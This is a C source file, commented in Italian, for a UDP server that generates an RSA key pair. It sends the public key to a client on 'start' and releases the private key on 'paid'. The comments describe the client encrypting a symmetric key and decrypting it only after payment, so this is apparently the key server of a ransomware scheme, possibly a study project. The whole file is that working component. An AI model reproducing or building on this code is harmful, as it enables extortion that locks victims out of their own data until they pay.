//for compile: gcc -ggdb -Wall -Wextra -o prova server.c -lcrypto

#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/bn.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/rand.h>

#define BUFLEN 512  //Lunghezza massima del messaggio
#define PORT 25001  //Porta di Default

//Lunghezza della stringa in cui è contenuta la chiave pubblica
int pub_key_tmp_l;
//Stringa in cui è contenuta la chiave pubblica
char * pub_key_tmp;
//Lunghezza della stringa in cui è contenuta la chiave privata
int pri_key_tmp_l;
//Stringa in cui è contenuta la chiave privata
char * pri_key_tmp;

//Funzione per stampare gli errori
void die(char *s)
{
    perror(s);
    exit(1);
}

//Funzione che genera una coppia di chiavi RSA sfruttando la libreria openSSL
void generateKeys() {

	int             ret = 0;
	RSA             *r = NULL;
	BIGNUM          *bne = NULL;	 

	int             bits = 2048;
	unsigned long   e = RSA_F4;

	//char 		buf[1024];
	//int		fd;
	//int		n;
 	
	//settiamo il PNRG
	if(!RAND_load_file("dev/urandom", 1024)) {
		printf("Can't seed PNRG");
	}

	//BN_new() alloca una struttura BIGNUM nel modo corretto.  
	bne = BN_new();

	//Bn_set_word(BIGNUM *a, unsigned long w) assegna alla struttura a con il valore w.	
	ret = BN_set_word(bne,e);
    	if(ret != 1){
        	printf("BN_set_word fallita");
		return;
   	}

	//RSA_new alloca e inizializza una struttura RSA.
    	r = RSA_new();
	//RSA_generate_key_ex crea una chiave privata di lunghezza bits e di esponente bne.
    	ret = RSA_generate_key_ex(r, bits, bne, NULL);
    	if(ret != 1){
      		printf("errore");
		return;
    	}
	
        //EVP_PKEY_new() inizializza una struttura EVP_PKEY che conterrà la chiave pubblica.
    	EVP_PKEY *pkey = EVP_PKEY_new();
	//EVP_PKEY_set1_RSA permette di ricavare la chiave pubblica dalla chiave privata generata in precedenza.
    	if (!EVP_PKEY_set1_RSA(pkey, r)) {
		printf("errore nel evp e pkey");
    	}
        
        //Per impacchettare le chiavi in messaggi, prima bisogna inserirle dentro una sorta di Input Stream detti BIO i quali ci
	//permetteranno di convertire le chiavi in stringhe di caratteri.
	//Sia BIO_new che BIO_S_mem sono funzioni che allocano e inizializzano queste strutture.
	BIO *pri = BIO_new(BIO_s_mem());
	BIO *pub = BIO_new(BIO_s_mem());

	//PEM_write_bio_RSAPrivateKey scrive la chiave privata in formato ? nello stream BIO pri.
	PEM_write_bio_RSAPrivateKey(pri, r, NULL, NULL, 0, NULL, NULL);
	//PEM_write_bio_PUBKEY scrive la chiave pubblica in formato ? nello stream BIO pub.
	PEM_write_bio_PUBKEY(pub, pkey);

  	//BIO_pending ritorna il numero di caratteri utilizzati dagli stream per rappresentare la chiave. pri_len e pub_len
	//serviranno per allocare le stringhe contenenti le chiavi.
  	size_t pri_len = BIO_pending(pri);
  	size_t pub_len = BIO_pending(pub);

	//Alloco le due stringhe.
	char *pri_key = malloc(pri_len + 1);
	char *pub_key = malloc(pub_len + 1);

	//BIO_read permette di leggere gli Stream Bio e traferirli in strnghe di caratteri. Perciò leggo dagli stream e scrivo
 	//nelle stringhe precedentemente allocate.
	BIO_read(pri, pri_key, pri_len);
	BIO_read(pub, pub_key, pub_len);
	
	//Aggiungo un caratteri terminatore alle stringhe.
  	pri_key[pri_len] = '\0';
  	pub_key[pub_len] = '\0';
  
  	//Stampo a video le chiavi.
  	printf("\n%s\n%s\n", pri_key, pub_key);
  
  	//Memorizzo nel programma le chiavi.
  	pub_key_tmp = malloc(pub_len + 1);
  	memcpy(pub_key_tmp, pub_key, pub_len + 1);
  	pub_key_tmp_l = pub_len + 1;

  	//Memorizzo nel programma le chiavi.
  	pri_key_tmp = malloc(pri_len +1);
  	memcpy(pri_key_tmp, pri_key, pri_len + 1);
  	pri_key_tmp_l = pri_len + 1;	  

  	//Liberiamo la memoria dalle strutture allocate.
  	RSA_free(r);
  	BIO_free_all(pub);
  	BIO_free_all(pri);
  	free(pri_key);
  	free(pub_key);
  
}

//Il programma principale apre una comunicazione con il Client e gli trasmette le chiavi a seconda della richiesta del Client.
int main(void)
{
    	//Inizializzazione delle strutture per la comunicazione tramite socket.
	struct sockaddr_in socket_server, socket_client; 
    	int s; 
   	socklen_t slen = sizeof(socket_client);
   	ssize_t recv_len;
    	
	//conterrà il messaggio da spedire.
    	char buf[BUFLEN];
    
	//socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP) crea un endpoint per la comunicazione(UDP a datagrammi con indirizzi IPv4) e 	ritorna un file descriptor che descrive la comunicazione appena creata.
    	if ((s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1){
       		die("socket");
   	}

	//Preparo la struttura che dovrà contenere il Socket, settando la porta e varie configurazioni.
    	memset((char *) &socket_server, 0, sizeof(socket_server));
    	socket_server.sin_family = AF_INET;
    	socket_server.sin_port = htons(PORT);
    	socket_server.sin_addr.s_addr = htonl(INADDR_ANY);
     
    	//Assegno al socket il file descriptor precedentemente creato cosi da ottenere un socket funzionante.
    	if( bind(s , (struct sockaddr*)&socket_server, sizeof(socket_server) ) == -1){
        die("bind");
    	}
     
	//Per ascoltare le communicazioni in entrata, il Server utilizza un while(true) una funziona di ricezione.
    	while(1){
		//Pulitura del buffer dai messaggi precedenti.
		memset(buf,'\0', BUFLEN);
	
        	printf("Active, aspetto pacchetti.");
		printf("\n");
		//Pulitura dello stream di Output.
        	fflush(stdout);
		printf("\n");
         
        	//Il Server si prepara per ricevere messaggi.
        	if ((recv_len = recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &socket_client, &slen)) == -1){
            		die("recvfrom()");
        	}
         
        	//Quando il Server riceve correttamente un messaggio, lo stampa a video, insieme alle informazioni del mittente.
        	printf("Pacchetto ricevuto da %s:%d\n", inet_ntoa(socket_client.sin_addr), ntohs(socket_client.sin_port));
		printf("\n");
        	printf("Data: %s\n" , buf);

		//Se il messaggio contiene "start" significa che il Client ha bisogna di una chiave pubblica per eseguire il
 		//processo di encrypt della chiave simmetrica.
		if (strcmp(buf,"start")==0) {
	  		generateKeys();
	  		//Invio la chiave pubblica al Client.
	  		if (sendto(s, pub_key_tmp, pub_key_tmp_l, 0, (struct sockaddr*) &socket_client, slen) == -1) {
	    			die("sendto()");
          		}
	
   		}
     	
		//Se il messaggio contiene "paid" allora il Client ha bisogna della chiave privata corrispondente alla chiave
		//pubblica
		//inviata in precedenza per eseguire il processo di decrypt della chiave simmetrica.
		if (strcmp(buf,"paid")==0) {
		//Invio la chiave privata al Client.
			if (sendto(s, pri_key_tmp, pri_key_tmp_l, 0, (struct sockaddr*) &socket_client, slen) == -1) {
				die("sendto()");
			}
			//Aggiungo il break in quanto il Server non deve più compiere operazioni.
			break;
		}
	
	
	}
  
	//Chiudo la comunicazione 
	printf("Fine dell'elaborazione");
	printf("\n");
	close(s);
	return 0;
}
